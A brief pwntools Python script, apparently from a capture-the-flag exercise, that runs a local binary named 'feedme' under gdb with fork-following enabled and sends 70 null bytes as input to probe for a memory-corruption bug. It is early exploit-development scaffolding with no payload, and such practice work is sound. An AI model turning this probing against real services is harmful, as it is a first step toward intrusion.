from pwn import *
context.terminal = ['tmux', 'splitw', '-h']

p = process('./feedme')
gdb.attach(p,'''

set follow-fork-mode child

''')

buf = ''
buf += '\x00' * 70

p.recvline()
p.send(buf)
p.interactive()
